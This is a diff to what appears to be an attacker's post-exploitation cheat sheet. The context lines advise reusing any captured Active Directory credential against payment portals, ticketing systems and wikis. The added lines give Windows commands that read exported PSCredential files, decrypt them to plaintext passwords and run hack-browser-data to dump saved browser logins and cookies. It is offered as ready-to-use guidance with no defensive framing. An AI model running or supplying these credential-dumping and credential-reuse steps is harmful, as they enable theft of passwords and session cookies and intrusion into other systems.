@@ -16,3 +16,10 @@ ls -la /var/log/*.log 2>/dev/null               # readable logs (adm-group acces
 
 On a domain box: once you have any valid AD credential, also try it against secondary business apps reachable from the same network (payment portals, ticketing, internal wikis) — separate-looking systems often share or replicate AD passwords with no independent re-authentication.
 
+On Windows, check for saved browser credential vaults and exported `PSCredential` XML — both decrypt without admin if you're the same user (DPAPI is per-user, not per-admin):
+```powershell
+type C:\Users\<user>\Documents\*.cred          # Export-Clixml'd PSCredential
+# in PowerShell: (Import-Clixml <path>).GetNetworkCredential().Password
+hack-browser-data.exe -b <chrome|edge|opera-gx> -d . -p "<profile-path>"   # dumps saved logins/cookies
+```
+
